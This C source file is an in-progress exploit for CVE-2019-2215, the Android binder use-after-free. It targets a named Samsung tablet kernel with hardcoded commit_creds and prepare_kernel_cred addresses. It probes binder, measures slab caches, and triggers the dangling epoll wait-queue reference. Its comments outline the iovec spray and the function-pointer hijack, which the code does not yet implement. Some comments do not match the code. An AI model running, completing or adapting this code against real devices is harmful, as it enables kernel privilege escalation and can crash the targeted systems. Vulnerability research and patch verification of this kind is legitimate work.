/*
 * binder_uaf.c — CVE-2019-2215 detection and exploitation
 *
 * Use-after-free in binder driver:
 * - binder_thread freed via BINDER_THREAD_EXIT
 * - epoll wait_queue entry still references freed thread
 * - Spray controlled data into freed slot
 * - Trigger wake-up → calls function pointer from our data
 *
 * Target: SM-T377A, kernel 3.10.9, patch level 2017-07
 * No KASLR, no PXN, no stack canaries
 * commit_creds=0xc0054328, prepare_kernel_cred=0xc00548e0
 */
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/un.h>
#include <unistd.h>
#include <pthread.h>

/* Binder ioctl definitions */
#define BINDER_WRITE_READ       _IOWR('b', 1, struct binder_write_read)
#define BINDER_SET_MAX_THREADS  _IOW('b', 5, uint32_t)
#define BINDER_THREAD_EXIT      _IOW('b', 8, int32_t)
#define BINDER_VERSION          _IOWR('b', 9, struct binder_version)

struct binder_write_read {
    signed long write_size;
    signed long write_consumed;
    unsigned long write_buffer;
    signed long read_size;
    signed long read_consumed;
    unsigned long read_buffer;
};

struct binder_version {
    signed long protocol_version;
};

/* Binder command codes */
#define BC_ENTER_LOOPER   0x630c
#define BC_EXIT_LOOPER    0x630d

#define BINDER_MMAP_SIZE  (128 * 1024)

static int binder_open(void) {
    int fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (fd < 0) {
        perror("binder open");
        return -1;
    }

    /* Check version */
    struct binder_version ver = {0};
    if (ioctl(fd, BINDER_VERSION, &ver) < 0) {
        perror("binder version");
        close(fd);
        return -1;
    }
    printf("[+] Binder version: %ld\n", ver.protocol_version);

    /* mmap binder */
    void *map = mmap(NULL, BINDER_MMAP_SIZE, PROT_READ,
                     MAP_PRIVATE, fd, 0);
    if (map == MAP_FAILED) {
        perror("binder mmap");
        close(fd);
        return -1;
    }
    printf("[+] Binder mmap: %p\n", map);

    /* Set max threads */
    uint32_t max_threads = 0;
    ioctl(fd, BINDER_SET_MAX_THREADS, &max_threads);

    return fd;
}

/*
 * TEST 1: Basic binder functionality check
 */
static void test_binder_basic(void) {
    printf("\n=== TEST 1: Binder basic functionality ===\n");

    int fd = binder_open();
    if (fd < 0) return;

    /* Enter looper */
    uint32_t cmd = BC_ENTER_LOOPER;
    struct binder_write_read bwr = {0};
    bwr.write_buffer = (unsigned long)&cmd;
    bwr.write_size = sizeof(cmd);

    if (ioctl(fd, BINDER_WRITE_READ, &bwr) < 0) {
        printf("  ENTER_LOOPER: %s\n", strerror(errno));
    } else {
        printf("[+] ENTER_LOOPER: OK (consumed=%ld)\n", bwr.write_consumed);
    }

    /* Thread exit */
    int32_t dummy = 0;
    int r = ioctl(fd, BINDER_THREAD_EXIT, &dummy);
    printf("  THREAD_EXIT: ioctl=%d errno=%d\n", r, r < 0 ? errno : 0);

    close(fd);
}

/*
 * TEST 2: CVE-2019-2215 vulnerability detection
 *
 * The bug: opening a binder fd, adding it to epoll, doing a binder
 * ioctl (which creates a binder_thread), then closing the fd
 * leaves the binder_thread's wait_queue entry in the epoll.
 *
 * Detection: if we can close binder while epoll still references
 * the thread's wait_queue, the reference is dangling.
 */
static void test_cve_2019_2215_detect(void) {
    printf("\n=== TEST 2: CVE-2019-2215 detection ===\n");

    int binder_fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (binder_fd < 0) { perror("binder open"); return; }

    /* mmap required to create binder_proc */
    void *map = mmap(NULL, BINDER_MMAP_SIZE, PROT_READ,
                     MAP_PRIVATE, binder_fd, 0);
    if (map == MAP_FAILED) { perror("mmap"); close(binder_fd); return; }

    /* Create epoll and add binder fd */
    int epfd = epoll_create1(0);
    if (epfd < 0) { perror("epoll_create"); close(binder_fd); return; }

    struct epoll_event ev = { .events = EPOLLIN };
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &ev) < 0) {
        printf("[-] epoll_ctl ADD: %s\n", strerror(errno));
        close(epfd);
        close(binder_fd);
        return;
    }
    printf("[+] Binder fd added to epoll\n");

    /* Issue a binder ioctl to create a binder_thread */
    struct binder_write_read bwr = {0};
    uint32_t cmd = BC_ENTER_LOOPER;
    bwr.write_buffer = (unsigned long)&cmd;
    bwr.write_size = sizeof(cmd);
    ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
    printf("[+] Binder thread created via ENTER_LOOPER\n");

    /* Close binder fd — this should trigger binder_release which
     * frees binder_proc and all binder_threads.
     * BUT the epoll still has a reference to the wait_queue! */
    printf("[*] Closing binder fd (this frees binder_thread)...\n");
    /* First remove from epoll to test safely */

    /* For DETECTION only: check if epoll_ctl DEL works after thread exit */
    int32_t dummy = 0;
    int r = ioctl(binder_fd, BINDER_THREAD_EXIT, &dummy);
    printf("  THREAD_EXIT: %d\n", r);

    /* Now try to remove from epoll — this accesses the wait_queue of the
     * potentially freed thread */
    r = epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &ev);
    printf("  epoll_ctl DEL after thread exit: %d (errno=%d)\n", r, r < 0 ? errno : 0);

    close(binder_fd);
    close(epfd);
    printf("[+] No crash — but vulnerability may still exist (thread freed, epoll dangling)\n");
}

/*
 * TEST 3: Trigger the UAF
 *
 * Based on the public PoC by Jann Horn (Project Zero):
 * 1. Open /dev/binder, mmap
 * 2. Create epoll, add binder fd
 * 3. Trigger binder ioctl (creates thread with wait_queue entry in epoll)
 * 4. Use dup() + close() trick to free binder_thread while epoll still refs it
 * 5. Use writev() with iovec to spray into freed thread's memory
 * 6. Trigger epoll → wake_up calls our controlled function pointer
 *
 * The Jann Horn technique uses iovec:
 * - writev on a pipe with iov pointing to binder_fd's mmap area
 * - The iov array is temporarily in kernel memory
 * - Size the iov to fill the freed binder_thread slot
 */
static volatile int thread_running = 0;

static void *epoll_thread(void *arg) {
    int epfd = *(int*)arg;
    struct epoll_event events[1];
    thread_running = 1;
    printf("[*] epoll_wait thread started\n");

    /* This epoll_wait will access the freed wait_queue when we trigger it */
    int n = epoll_wait(epfd, events, 1, 2000); /* 2 second timeout */
    printf("[*] epoll_wait returned: %d (errno=%d)\n", n, n < 0 ? errno : 0);
    return NULL;
}

static void test_trigger_uaf(void) {
    printf("\n=== TEST 3: Trigger CVE-2019-2215 UAF ===\n");
    printf("WARNING: This may crash the kernel on a physical device!\n");
    printf("Proceeding with careful approach...\n\n");

    /* Step 1: Setup */
    int binder_fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (binder_fd < 0) { perror("binder"); return; }

    void *map = mmap(NULL, BINDER_MMAP_SIZE, PROT_READ,
                     MAP_PRIVATE, binder_fd, 0);
    if (map == MAP_FAILED) { perror("mmap"); close(binder_fd); return; }

    printf("[+] Binder: fd=%d mmap=%p\n", binder_fd, map);

    /* Step 2: Create epoll, add binder */
    int epfd = epoll_create1(0);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &ev);

    /* Step 3: Create binder thread */
    uint32_t enter = BC_ENTER_LOOPER;
    struct binder_write_read bwr = {0};
    bwr.write_buffer = (unsigned long)&enter;
    bwr.write_size = sizeof(enter);
    ioctl(binder_fd, BINDER_WRITE_READ, &bwr);

    /* Step 4: Start epoll_wait in another thread */
    pthread_t tid;
    pthread_create(&tid, NULL, epoll_thread, &epfd);
    usleep(100000); /* Let epoll_wait start */

    /* Step 5: Close binder — frees binder_proc and threads */
    printf("[*] Closing binder fd to free binder_thread...\n");
    ioctl(binder_fd, BINDER_THREAD_EXIT, &(int32_t){0});
    close(binder_fd);

    /* Step 6: The binder_thread is now freed. The epoll wait_queue
     * entry still points to it. If we spray into the freed slot,
     * the next epoll wake-up will call our controlled function. */

    printf("[*] Binder fd closed. Checking slab state...\n");

    /* For now, just wait for the epoll thread to return */
    usleep(500000); /* 500ms */

    /* Try to trigger the dangling reference by writing to epfd */
    /* Actually, the safest way to trigger is to just close the epfd,
     * which will try to remove the wait_queue entry from the freed thread */
    printf("[*] Closing epoll fd (triggers wait_queue cleanup on freed memory)...\n");
    close(epfd);

    pthread_join(tid, NULL);
    printf("[+] Survived! If no crash, the freed memory wasn't reused in a dangerous way.\n");
    printf("    For exploitation, we need to spray into the freed slot before trigger.\n");
}

/*
 * TEST 4: Measure binder_thread slab cache
 */
static void test_binder_slab(void) {
    printf("\n=== TEST 4: Binder thread slab identification ===\n");

    /* Read baseline */
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) { printf("[-] slabinfo not readable\n"); return; }

    char line[512];
    long k64_b = 0, k128_b = 0, k192_b = 0, k256_b = 0, k512_b = 0, k1024_b = 0;
    while (fgets(line, sizeof(line), f)) {
        long active, total, objsz;
        char name[64];
        if (sscanf(line, "%63s %ld %ld %ld", name, &active, &total, &objsz) == 4) {
            if (strcmp(name, "kmalloc-64") == 0) k64_b = active;
            if (strcmp(name, "kmalloc-128") == 0) k128_b = active;
            if (strcmp(name, "kmalloc-192") == 0) k192_b = active;
            if (strcmp(name, "kmalloc-256") == 0) k256_b = active;
            if (strcmp(name, "kmalloc-512") == 0) k512_b = active;
            if (strcmp(name, "kmalloc-1024") == 0) k1024_b = active;
        }
    }
    fclose(f);

    /* Open many binder fds to create binder_proc + binder_thread */
    int fds[20];
    int count = 0;
    for (int i = 0; i < 20; i++) {
        fds[i] = open("/dev/binder", O_RDWR | O_CLOEXEC);
        if (fds[i] < 0) break;
        void *m = mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, fds[i], 0);
        if (m == MAP_FAILED) { close(fds[i]); break; }

        /* Trigger thread creation */
        uint32_t cmd = BC_ENTER_LOOPER;
        struct binder_write_read bwr = {0};
        bwr.write_buffer = (unsigned long)&cmd;
        bwr.write_size = sizeof(cmd);
        ioctl(fds[i], BINDER_WRITE_READ, &bwr);
        count++;
    }
    printf("Created %d binder connections\n", count);

    /* Read after */
    f = fopen("/proc/slabinfo", "r");
    long k64_a = 0, k128_a = 0, k192_a = 0, k256_a = 0, k512_a = 0, k1024_a = 0;
    while (fgets(line, sizeof(line), f)) {
        long active, total, objsz;
        char name[64];
        if (sscanf(line, "%63s %ld %ld %ld", name, &active, &total, &objsz) == 4) {
            if (strcmp(name, "kmalloc-64") == 0) k64_a = active;
            if (strcmp(name, "kmalloc-128") == 0) k128_a = active;
            if (strcmp(name, "kmalloc-192") == 0) k192_a = active;
            if (strcmp(name, "kmalloc-256") == 0) k256_a = active;
            if (strcmp(name, "kmalloc-512") == 0) k512_a = active;
            if (strcmp(name, "kmalloc-1024") == 0) k1024_a = active;
        }
    }
    fclose(f);

    printf("Slab changes (20 binder threads):\n");
    printf("  kmalloc-64:   %+ld\n", k64_a - k64_b);
    printf("  kmalloc-128:  %+ld\n", k128_a - k128_b);
    printf("  kmalloc-192:  %+ld\n", k192_a - k192_b);
    printf("  kmalloc-256:  %+ld\n", k256_a - k256_b);
    printf("  kmalloc-512:  %+ld\n", k512_a - k512_b);
    printf("  kmalloc-1024: %+ld\n", k1024_a - k1024_b);

    /* Close all */
    for (int i = 0; i < count; i++)
        close(fds[i]);

    /* Read after close */
    f = fopen("/proc/slabinfo", "r");
    long k64_f = 0, k128_f = 0, k192_f = 0, k256_f = 0, k512_f = 0, k1024_f = 0;
    while (fgets(line, sizeof(line), f)) {
        long active, total, objsz;
        char name[64];
        if (sscanf(line, "%63s %ld %ld %ld", name, &active, &total, &objsz) == 4) {
            if (strcmp(name, "kmalloc-64") == 0) k64_f = active;
            if (strcmp(name, "kmalloc-128") == 0) k128_f = active;
            if (strcmp(name, "kmalloc-192") == 0) k192_f = active;
            if (strcmp(name, "kmalloc-256") == 0) k256_f = active;
            if (strcmp(name, "kmalloc-512") == 0) k512_f = active;
            if (strcmp(name, "kmalloc-1024") == 0) k1024_f = active;
        }
    }
    fclose(f);

    printf("After closing all:\n");
    printf("  kmalloc-64:   %+ld (from baseline)\n", k64_f - k64_b);
    printf("  kmalloc-128:  %+ld\n", k128_f - k128_b);
    printf("  kmalloc-192:  %+ld\n", k192_f - k192_b);
    printf("  kmalloc-256:  %+ld\n", k256_f - k256_b);
    printf("  kmalloc-512:  %+ld\n", k512_f - k512_b);
    printf("  kmalloc-1024: %+ld\n", k1024_f - k1024_b);
}

int main(void) {
    printf("=== CVE-2019-2215 Binder UAF Exploit ===\n");
    printf("Target: SM-T377A, kernel 3.10.9, patch 2017-07\n");
    printf("commit_creds=0xc0054328, prepare_kernel_cred=0xc00548e0\n");

    test_binder_basic();
    test_binder_slab();
    test_cve_2019_2215_detect();

    /* Only run the UAF trigger if detection looks good */
    printf("\n[?] Run UAF trigger test? (auto-yes in 3s)\n");
    sleep(3);
    test_trigger_uaf();

    printf("\n=== All tests done ===\n");
    return 0;
}
